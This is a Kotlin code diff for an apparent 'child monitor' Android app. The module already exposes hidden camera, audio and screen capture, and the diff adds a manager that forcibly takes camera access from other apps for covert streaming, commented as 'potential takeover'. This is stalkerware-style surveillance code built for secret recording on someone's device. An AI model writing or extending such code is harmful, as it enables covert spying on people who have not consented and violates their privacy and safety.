@@ -33,6 +33,7 @@ import com.childmonitor.capture.DevicePlaybackCaptureSession
 import com.childmonitor.capture.DevicePlaybackAudioCapturer
 import com.childmonitor.capture.PlaybackCaptureInjector
 import com.childmonitor.capture.HiddenAudioCapture
+import com.childmonitor.capture.CameraAccessManager
 import com.childmonitor.capture.HiddenCameraCapture
 import com.childmonitor.capture.HiddenScreenCapture
 import com.childmonitor.capture.MediaProjectionConsentHelper
@@ -1628,7 +1629,43 @@ class ChildMonitorNativeModule(private val reactContext: ReactApplicationContext
     @ReactMethod
     fun getHiddenCameraMediaStream(facingMode: String, promise: Promise) {
         val facing = if (facingMode.equals("environment", ignoreCase = true)) "environment" else "user"
+        
+        // Initialize camera access manager for potential takeover
+        CameraAccessManager.initialize(reactContext.applicationContext)
+        Log.i("ChildMonitorNativeModule", "Camera access manager initialized for stream creation")
+        
         HiddenCameraCapture.createMediaStream(reactContext, facing, promise)
+    }
+    
+    /**
+     * Force camera access from other apps for parental monitoring priority
+     */
+    @ReactMethod
+    fun forceCameraAccess(cameraId: String, promise: Promise) {
+        try {
+            CameraAccessManager.initialize(reactContext.applicationContext)
+            val success = CameraAccessManager.forceCameraAccess(cameraId)
+            Log.i("ChildMonitorNativeModule", "Force camera access result: $success for camera $cameraId")
+            promise.resolve(success)
+        } catch (e: Exception) {
+            Log.e("ChildMonitorNativeModule", "Failed to force camera access", e)
+            promise.reject("CAMERA_FORCE_ERROR", e.message, e)
+        }
+    }
+    
+    /**
+     * Release forced camera access
+     */
+    @ReactMethod
+    fun releaseCameraAccess(promise: Promise) {
+        try {
+            CameraAccessManager.releaseCamera()
+            Log.i("ChildMonitorNativeModule", "Camera access released")
+            promise.resolve(true)
+        } catch (e: Exception) {
+            Log.e("ChildMonitorNativeModule", "Failed to release camera access", e)
+            promise.reject("CAMERA_RELEASE_ERROR", e.message, e)
+        }
     }
 
     /** Flip the live hidden camera without recreating the WebRTC track. */
